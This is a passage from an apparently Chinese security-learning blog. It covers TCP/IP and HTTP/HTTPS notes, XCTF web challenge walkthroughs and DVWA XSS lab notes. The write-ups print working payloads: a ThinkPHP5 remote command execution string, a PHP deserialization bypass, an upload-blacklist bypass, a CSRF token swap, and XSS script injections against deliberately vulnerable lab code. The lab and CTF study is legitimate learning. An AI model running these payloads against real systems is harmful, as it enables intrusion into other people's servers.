Base）访问网络接口的信息，通信数据量以及设备温度等信息。<br>5、TCP/IP分层与通信<br>1）每个分层都会对所发数据附加一个首部，上一层的数据加首部就是的数据。<br>2）数据单位：<br>&lt;1&gt;包：全能性术语；<br>&lt;2&gt;帧：数据链路层中包的单位；<br>&lt;3&gt;数据报：IP和UDP等网络层以上分层中包的单位；<br>&lt;4&gt;段：TCP数据流中的信息；<br>消息：应用协议的数据的单位；<br>3）发送数据包的例子（发邮件）<br>&lt;1&gt;填写收件人邮箱（应用层，SMTP）；<br>&lt;2&gt;邮件内容编码（表示层）；<br>&lt;3&gt;群发还是单发（会话层）。<br>3）TCP模块的处理<br>&lt;1&gt;根据会话层的指示，建立连接；<br>&lt;2&gt;在应用层数据的前端加上TCP首部，包括：1）源端口号和目标端口号（用于识别发送主机和接受主机的应用），2）序号（用于确定发送包的哪部分数据），3）校验和（用于判断数据是否损坏）。<br>4)IP模块的处理<br>&lt;1&gt;IP将“TCP首部 + 应用层数据”合起来当作自己的数据，并在TCP首部前面加上IP首部；IP首部中包含发送和接受端的IP地址，后面还有用来判断其后数据是TCP还是UDP的信息。<br>&lt;2&gt;IP包生成后，参考路由控制表决定IP包的路由或主机。发送给连接这些路由器或主机的驱动程序。<br>&lt;3&gt;如不知道接收端MAC地址，可以用ARP（Address Resolution Protocol）查找。只要知道了IP和MAC就可以给以太网驱动程序实现传输。<br>&lt;4&gt;网络接口（以太网驱动）处理5)附加上以太网首部：接收端与发送端的MAC地址，标志以太网类型的以太网数据协议。<br>并由硬件计算FCS（Frame Check Sequence），添加到包的最后用以判断数据包是否由于噪声而被破坏。<br>5)经过数据链路的包<br>&lt;1&gt;以太网包首部，IP包首部，TCP（UDP）包首部，以及以太网包尾；<br>&lt;2&gt;包的首部包含：<br>发送端接收端的地址（以太网/MAC，IP/IP，TCP（UDP）/端口）；<br>上一个协议类型；<br>协议自身信息<br>6)应用程序的处理<br>&lt;1&gt;网络接口：先判断接受端MAC地址是不是自己的MAC地址，如不是则丢弃。如果是则先查看数据类型，如果是IP包则传给IP子程序，如果是ARP则给ARP。如果无法识别数据类型则丢弃；<br>&lt;2&gt;IP模块：同样先查看IP，后查看数据类型；在有路由器的情况下，会根据路由控制表调查该送达的主机和路由进行转发。<br>&lt;3&gt;TCP模块：先计算校验和，判断数据是否损坏。然后检查是否在按照顺序接受数据，完成后返回确认回执给发送端；最后查看端口号把数据给相应的程序；<br>&lt;4&gt;应用程序：接受TCP传来的数据处理并作出响应（正常/异常）。<br><strong>三、数据链路层</strong><br>数据链路层的作用：数据链路层协议规定了通过信息通信媒介互联的设备之间传输的规范。 0，1等计算机二进制 -&gt; 电压高低，光的闪灭以及电波强弱。<br>涉及名词：VLAN（Virtual Local Area Network），WLAN（Wireless Local Area Network），PPP（Point to Point Protocol），FDDI（Fiber Distributed Data Interface），ATM（Asynchronous Transfer Mode）。<br>数据链路的段：被分割的网络。例如，使用中继器相连的两个网线在网络层上讲是一个网络，但在数据链路层上是2个段，一根网线一个段。<br>1、数据链路相关技术<br>1）MAC地址：用于识别数据链路中互连的节点。<br>以太网或FDDI中的MAC和无限LAN与蓝牙等MAC是不同规范；<br>烧入ROM中，全世界唯一；<br>长度为48比特</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/18/http%E4%B8%8Ehttps/">
                HTTP与HTTPS的区别
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-18</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h1><p> 前言：无论是在校学习还是找工作的时候，老师和面试官都问过同学 HTTP 和 HTTPS 的区别。平时上网的时候也没有关注这个问题，只是知道计算机网络里 HTTP 的概念，所以最近才查资料好好补补这一块。其实这一块的知识延伸很广，如果之前不太了解加密算法和 SSL 协议，可以在学习了这个问题的基础上再做研究。</p>
<p>一、基本概念<br>1、HTTP：互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（TCP），用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。<br>2、HTTPS：HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 [1]  。HTTPS 在HTTP 的基础下加入SSL，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。这个系统提供了身份验证与加密通讯方法。它被广泛用于万维网上安全敏感的通讯，例如交易支付等方面<br>二、HTTPS作用<br>　　HTTPS协议的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。<br>三、HTTPS出现的原因：超文本传输协议HTTP协议被用于Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送了内容，不提供任何方式的数据加密<br><img src="https://img-blog.csdnimg.cn/20210502143552643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>四、HTTPS工作流程：<br>  1、TCP 三次同步握手<br>2、客户端验证服务器数字证书<br>3、DH 算法协商对称加密算法的密钥、hash 算法的密钥<br>4、SSL 安全加密隧道协商完成<br>5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改<br>五、HTTPS与HTTP的区别<br>1、HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。<br>2、使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。<br>3、HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。<br>4、http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。<br>5、HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。<br><img src="https://img-blog.csdnimg.cn/20210502145323239.png" alt="在这里插入图片描述"><br>五、HTTP的不足：<br>1.HTTP虽然使用极为广泛, 但是却存在不小的安全缺陷, 主要是其数据的明文传送和消息完整性检测的缺乏, 而这两点恰好是网络支付, 网络交易等新兴应用中安全方面最需要关注的 。<br>2.关于 HTTP的明文数据传输, 攻击者最常用的攻击手法就是网络嗅探, 试图从传输过程当中分析出敏感的数据, 例如管理员对 Web 程序后台的登录过程等等, 从而获取网站管理权限, 进而渗透到整个服务器的权限。即使无法获取到后台登录信息, 攻击者也可以从网络中获取普通用户的隐秘信息, 包括手机号码, 身份证号码, 信用卡号等重要资料, 导致严重的安全事故。进行网络嗅探攻击非常简单, 对攻击者的要求很低。使用网络发布的任意一款抓包工具, 一个新手就有可能获取到大型网站的用户信息<br>3.另外,HTTP在传输客户端请求和服务端响应时, 唯一的数据完整性检验就是在报文头部包含了本次传输数据的长度, 而对内容是否被篡改不作确认。 因此攻击者可以轻易的发动中间人攻击, 修改客户端和服务端传输的数据, 甚至在传输数据中插入恶意代码, 导致客户端被引导至恶意网站被植入木马 </p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6/">
                攻防世界web高手进阶题
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-16</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>@<a href="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E9%A2%98">TOC</a></p>
<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_ web"></a>baby_ web</h2><p><img src="https://img-blog.csdnimg.cn/20210320195352421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>相关知识：http中请求行请求报文以及初始页面<br><img src="https://img-blog.csdnimg.cn/20210320082512136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一、http中请求行请求报文<br>1、出现的原因：http是个无状态的协议，所以，需要在请求头和响应头中包括自身的一些信息和想要执行的动作，这样，对方在收到信息后，就可以知道你是谁，你想干什么。<br>2、http的请求报文由三部分组成：请求行、请求头、请求体<br>（1）请求行<br>&lt;1&gt;定义：默认1.1长连接, 1.0的以及被淘汰了<br>&lt;2&gt;格式：请求方式 请求资源  协议版本<br>&lt;3&gt;举例：POST /myday33/login.html HTTP/1.1，POST为请求方式，myday33/login.html为请求资源（也就是url），HTTP/1.1为协议版本<br>（2）请求头<br>&lt;1&gt;定义：客户端发给服务端的一些附加信息<br>&lt;2&gt;格式：key:value<br>请求头描述了客户端向服务器发送请求时使用的http协议类型，所使用的编码，以及发送内容的长度，refer，等等。refer是干嘛的，一般用来做简单的防跨站攻击。<br>（3）请求体<br> &lt;1&gt;并不是任何时候都有数据的,只有在post提交并且有参数的时候,请求体才有数据,其他情况没有.<br>&lt;2&gt;格式： name=value&amp;name=value…<br><img src="https://img-blog.csdnimg.cn/20210320085202302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>本题涉及到robots协议的知识点，具体可查看博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53549425/article/details/113367014?spm=1001.2014.3001.5501">攻防世界新手题</a></p>
<h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p><img src="https://img-blog.csdnimg.cn/20210424155632669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>相关知识：代码审计以及PHP源代码文件<br>phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。<br>1.打开浏览器，访问<a target="_blank" rel="noopener" href="http://111.198.29.45:45191/index.phps">http://111.198.29.45:45191/index.phps</a> 得到主页源代码。<br>2.进行代码审计，可看出需要用GET方式给id参数传递一个为“admin”的值，但是会经过一次urldecode()，会将传入的值进行url解码，所以要对admin进行两次url编码。<br>3.对admin字符串进行第一次url编码得到%61%64%6d%69%6e<br>4.将%61%64%6d%69%6e再次进行url编码得到%2561%2564%256d%2569%256e<br>5.访问<a target="_blank" rel="noopener" href="http://111.198.29.45:45191/index.php?id=%2561%2564%256d%2569%256e">http://111.198.29.45:45191/index.php?id=%2561%2564%256d%2569%256e</a> 得到flag.<br>PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。</p>
<h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p><img src="https://img-blog.csdnimg.cn/20210424160014647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>相关知识：当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。<br>1.打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。<br>2.public属性序列化后格式为：数据类型:属性名长度:”属性名”;数据类型:属性值长度:”属性值”。<br>3.本题目中，只存在一个变量，正常情况下序列化后，如下所示。<br><img src="https://img-blog.csdnimg.cn/20210424160102847.png" alt="在这里插入图片描述"><br>4.将设置属性值为2，可导致反序列化异常，如下所示。<br><img src="https://img-blog.csdnimg.cn/20210424160134111.png" alt="在这里插入图片描述"><br>4.根据代码中的?code= 可得知，将得到的序列化字符串赋值给code进行传递。<br>5.访问<a target="_blank" rel="noopener" href="http://111.198.29.45:34517/?code=O:4:&quot;xctf&quot;:2:%7Bs:4:&quot;flag&quot;;s:3:&quot;111&quot;;%7D%E5%BE%97%E5%88%B0flag%E3%80%82">http://111.198.29.45:34517?code=O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}得到flag。</a></p>
<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><img src="https://img-blog.csdnimg.cn/20210427172959316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>相关知识：文件上传漏洞：文件上传漏洞是web安全中经常用到的一种漏洞形式。是对数据与代码分离原则的一种攻击。上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。<br>第一步：选择上传文件时发现，客户端有对文件后缀绕过处理<img src="https://img-blog.csdnimg.cn/20210427173048649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步：利用burp，需要对报文进行修改<br><img src="https://img-blog.csdnimg.cn/20210427173123747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三步：顺利上传木马文件，用工具连接即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210427173205929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如何绕过文件上传黑名单：使用不常见的文件后缀名绕过，例如php3，php4，phtml，asa等等。</p>
<h2 id="php-rce（thinkphp5-远程命令执行漏洞）"><a href="#php-rce（thinkphp5-远程命令执行漏洞）" class="headerlink" title="php-rce（thinkphp5 远程命令执行漏洞）"></a>php-rce（thinkphp5 远程命令执行漏洞）</h2><p>thinkphp5 漏洞利用（具体自行百度）<br><img src="https://img-blog.csdnimg.cn/20210505173341623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=<span class="regexp">/index/</span>\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span>[0]=<span class="title">system</span>&amp;<span class="title">vars</span>[1][]=<span class="title">php</span>%20-<span class="title">r</span>%20%27<span class="title">system</span>(<span class="params"><span class="string">&quot;cat%20../../../flag&quot;</span></span>)</span>;%<span class="number">27</span></span><br></pre></td></tr></table></figure>
<p>贴出payload</p>
<h2 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h2><p>先用sqlmap扫了一下没有sql注入，尝试注册个账号看看，然后发现admin用户可以获得flag，<br><img src="https://img-blog.csdnimg.cn/20210505173453791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>抓个包看看，点击GETFLAG抓包：看能不能篡改为admin用户</p>
<p><img src="https://img-blog.csdnimg.cn/20210505173510389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>发现有csrftoken，还有加密的username</p>
<p>csrftoken：为了防止跨站域请求伪造，有的网站请求中会加入这个验证，在登录及登录后续的操作都会让你携带csrftoken，问题在于csrftoken每次刷新界面都要发生变化，所以查到csrf生成的位置就是关键所在，有的网站会把csrftoken放在html代码中返回给前端，这种找起来会比较简单</p>
<p>信息不足，用御剑扫描一下：发现了 test.php 和 action.php页面</p>
<p>其中test.php中有一段 密文 ： E5xqqsvHoznsjlfDm5ryLg==   应该是admin 加密后密文</p>
<p>点开action.php页面  返回了 当前用户的 username 和 新生成的 csrftoken值，</p>
<p>在action.php页面抓包，把username改为  E5xqqsvHoznsjlfDm5ryLg==</p>
<p>提交得到 admin的 csrftoken值：7ee17a7dc9b90025d12c2d8a86584c8e</p>
<p><img src="https://img-blog.csdnimg.cn/20210505173556774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后在 logined.php中点击GETFALG抓包，把username 和 csrftoken改为刚才获得的值</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/05/16/XSS%E5%AE%9E%E6%88%98/">
                XSS实战
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-16</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>一、xss注入的场景是一些论坛的留言板之类的，攻击者利用网页的漏洞写入程序脚本，当用户浏览的时候就会触发这个脚本。<br>reflected的xss只能是一次性的，而stored的xss是永久的，写入到留言板之后，就传入到服务器当中，当再有用户浏览时就会触发。<br>xss跟sql是非常想象的，最大的区别在于xss是前段，而sql是后端。且，xss很难获得webshell。<br>二、DVWA（low）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != NULL ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>没有任何过滤，直接写&lt; script&gt;alert(//xss)&lt; /script&gt;<br>成功<br>二、medium：查看源代码发现存在替换，但没有过滤大小写，所以</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">vulnerabilities/xss_r/source/medium.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != NULL ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    echo <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<p>&lt; Script&gt;alert(/xss/)&lt; /Script&gt;</p>
<p>三、stored（low）<br><img src="https://img-blog.csdnimg.cn/20210516113153975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
<p>查看源码发现没有任何防护，但是name长度有限制，可以使用hacker修改<br><img src="https://img-blog.csdnimg.cn/20210516113357930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改maxlength为100<img src="https://img-blog.csdnimg.cn/20210516113439964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接XSS语句即可<br>二、stroed（medium）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) or die( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> 